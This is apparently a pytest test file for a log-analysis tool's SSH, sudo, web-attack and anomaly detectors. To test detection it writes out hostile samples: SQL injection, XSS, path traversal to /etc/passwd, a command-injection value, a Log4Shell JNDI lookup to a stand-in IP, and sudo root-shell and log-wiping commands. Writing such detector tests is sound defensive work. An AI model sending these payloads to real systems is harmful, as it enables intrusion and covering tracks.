from datetime import timedelta

import pandas as pd
import pytest
from conftest import DAY, accepted, access, every, failed, syslog

from loganalyzer.config import DetectionConfig
from loganalyzer.detectors.anomaly import (
    detect_behavioral_outliers,
    detect_volume_spikes,
    robust_zscores,
)
from loganalyzer.detectors.auth import (
    detect_bruteforce,
    detect_password_spraying,
    detect_sensitive_sudo,
    detect_success_after_failures,
)
from loganalyzer.detectors.base import peak_in_window, top_values
from loganalyzer.detectors.web import (
    detect_attack_payloads,
    detect_forced_browsing,
    detect_login_bruteforce,
    detect_sensitive_file_probes,
)
from loganalyzer.models import Severity
from loganalyzer.parsers import parse_access_lines, parse_auth_lines

CFG = DetectionConfig()


def auth(lines):
    return parse_auth_lines(lines, year=2026).events


def web(lines):
    return parse_access_lines(lines).events


# --- helpers ----------------------------------------------------------------------------------


def test_peak_in_window_slides_over_events():
    times = pd.Series(pd.to_datetime(["10:00", "10:01", "10:02", "10:30", "10:31"], format="%H:%M"))
    assert peak_in_window(times, "5min") == 3
    assert peak_in_window(times, "60min") == 5
    assert peak_in_window(pd.Series(dtype="datetime64[ns]"), "5min") == 0


def test_top_values_omits_counts_when_all_unique():
    assert top_values(pd.Series(["a", "b", "c"]), 2) == "a, b, +1 more"
    assert top_values(pd.Series(["a", "a", "b"])) == "a (2), b (1)"


# --- SSH --------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("count", "spacing_s", "expected"), [(10, 20, 1), (9, 20, 0), (10, 300, 0)]
)
def test_bruteforce_threshold_and_window(count, spacing_s, expected):
    events = auth([failed(t, "203.0.113.1") for t in every(DAY, count, spacing_s)])
    findings = detect_bruteforce(events, CFG)
    assert len(findings) == expected
    if findings:
        assert findings[0].severity is Severity.HIGH
        assert findings[0].mitre == "T1110.001"


def test_password_spraying_needs_distinct_users():
    users = ["admin", "test", "oracle", "git", "pi"]
    sprayed = auth(
        [failed(DAY + timedelta(minutes=i), "203.0.113.2", u, True) for i, u in enumerate(users)]
    )
    assert len(detect_password_spraying(sprayed, CFG)) == 1
    fewer = auth(
        [
            failed(DAY + timedelta(minutes=i), "203.0.113.2", u, True)
            for i, u in enumerate(users[:4])
        ]
    )
    assert detect_password_spraying(fewer, CFG) == []


def test_success_after_failures_is_critical():
    lines = [failed(t, "203.0.113.3", "deploy") for t in every(DAY, 5, 10)]
    lines.append(accepted(DAY + timedelta(minutes=2), "203.0.113.3", "deploy"))
    (finding,) = detect_success_after_failures(auth(lines), CFG)
    assert finding.severity is Severity.CRITICAL
    assert (finding.user, finding.source_ip, finding.event_count) == ("deploy", "203.0.113.3", 6)


def test_typo_then_success_is_not_a_compromise():
    lines = [failed(DAY, "10.0.0.8", "bob"), failed(DAY + timedelta(seconds=5), "10.0.0.8", "bob")]
    lines.append(accepted(DAY + timedelta(seconds=10), "10.0.0.8", "bob"))
    assert detect_success_after_failures(auth(lines), CFG) == []


def test_success_before_failures_is_not_a_compromise():
    lines = [accepted(DAY, "203.0.113.4", "alice")]
    lines += [failed(t, "203.0.113.4", "alice") for t in every(DAY + timedelta(minutes=1), 8, 5)]
    assert detect_success_after_failures(auth(lines), CFG) == []


def test_sensitive_sudo_flags_shells_but_not_log_reading():
    def sudo(cmd):
        return syslog(
            DAY, f"   eve : TTY=pts/0 ; PWD=/home/eve ; USER=root ; COMMAND={cmd}", "sudo"
        )

    benign = auth(
        [sudo("/usr/bin/tail -n 50 /var/log/syslog"), sudo("/usr/bin/systemctl restart nginx")]
    )
    assert detect_sensitive_sudo(benign, CFG) == []
    risky = auth([sudo("/bin/bash"), sudo("/usr/bin/truncate -s 0 /var/log/wtmp")])
    (finding,) = detect_sensitive_sudo(risky, CFG)
    assert finding.event_count == 2
    assert "interactive root shell" in finding.description


# --- web --------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("path", "ua", "category"),
    [
        ("/item?id=1%27%20OR%20%271%27%3D%271", "Mozilla/5.0", "SQL injection"),
        ("/item?id=1+UNION+ALL+SELECT+NULL,NULL--", "Mozilla/5.0", "SQL injection"),
        ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "Mozilla/5.0", "Cross-site scripting"),
        ("/files/%252e%252e%252f%252e%252e%252fetc/passwd", "Mozilla/5.0", "Path traversal"),
        ("/ping?host=127.0.0.1%3Bcat%20/etc/hosts", "Mozilla/5.0", "Command injection"),
        ("/", "${jndi:ldap://203.0.113.9/a}", "Log4Shell"),
    ],
)
def test_attack_payload_signatures(path, ua, category):
    findings = detect_attack_payloads(web([access("203.0.113.5", path, ua=ua)]), CFG)
    assert any(f.title.startswith(category) for f in findings), [f.title for f in findings]


@pytest.mark.parametrize(
    "path",
    [
        "/products?id=42&sort=price",
        "/search?q=rock+and+roll",
        "/blog/how-to-use-union-select-safely",
        "/docs/../index.html",
        "/api/items?filter=price%3E10",
        "/static/js/app.js?v=3",
    ],
)
def test_benign_urls_do_not_match_attack_signatures(path):
    assert detect_attack_payloads(web([access("198.51.100.5", path)]), CFG) == []


def test_sensitive_file_served_is_high_blocked_is_medium():
    served = detect_sensitive_file_probes(web([access("203.0.113.6", "/.env", 200)]), CFG)
    blocked = detect_sensitive_file_probes(web([access("203.0.113.6", "/.env", 404)]), CFG)
    assert served[0].severity is Severity.HIGH
    assert blocked[0].severity is Severity.MEDIUM


def test_forced_browsing_requires_many_distinct_paths():
    scan = web([access("203.0.113.7", f"/dir{i}", 404) for i in range(40)])
    assert len(detect_forced_browsing(scan, CFG)) == 1
    same_path = web([access("203.0.113.7", "/login", 401, method="POST") for _ in range(40)])
    assert detect_forced_browsing(same_path, CFG) == []


def test_login_bruteforce():
    lines = [
        access("203.0.113.8", "/login", 401, when=t, method="POST") for t in every(DAY, 25, 10)
    ]
    (finding,) = detect_login_bruteforce(web(lines), CFG)
    assert finding.severity is Severity.HIGH
    assert "25 were rejected" in finding.description


# --- statistics / ML --------------------------------------------------------------------------


def test_robust_zscore_is_not_masked_by_the_spike_itself():
    counts = pd.Series([5, 6, 5, 4, 6, 5, 5, 300])
    z = robust_zscores(counts)
    assert z.iloc[-1] > 100 and z.iloc[:-1].abs().max() < 3


def test_flat_series_has_no_spikes():
    stamps = pd.Series(pd.date_range(DAY, periods=120, freq="1min"))
    assert detect_volume_spikes(stamps, CFG, "events") == []


def test_volume_spike_detected_and_merged():
    base = list(pd.date_range(DAY, periods=48, freq="15min"))
    burst = list(pd.date_range(DAY + timedelta(hours=5), periods=80, freq="7s"))
    findings = detect_volume_spikes(pd.Series(base + burst), CFG, "events")
    assert len(findings) == 1
    assert findings[0].event_count >= 60


def test_behavioral_outliers_need_a_population():
    features = pd.DataFrame({"requests": [10.0] * 5}, index=[f"10.0.0.{i}" for i in range(5)])
    assert detect_behavioral_outliers(features, CFG, set()) == []


def test_behavioral_outliers_skip_ips_already_flagged():
    idx = [f"198.51.100.{i}" for i in range(40)] + ["203.0.113.200"]
    features = pd.DataFrame(
        {"requests": [20.0] * 41, "bytes_per_request": [15_000.0] * 40 + [50_000_000.0]}, index=idx
    )
    assert [f.source_ip for f in detect_behavioral_outliers(features, CFG, set())] == [
        "203.0.113.200"
    ]
    assert detect_behavioral_outliers(features, CFG, {"203.0.113.200"}) == []
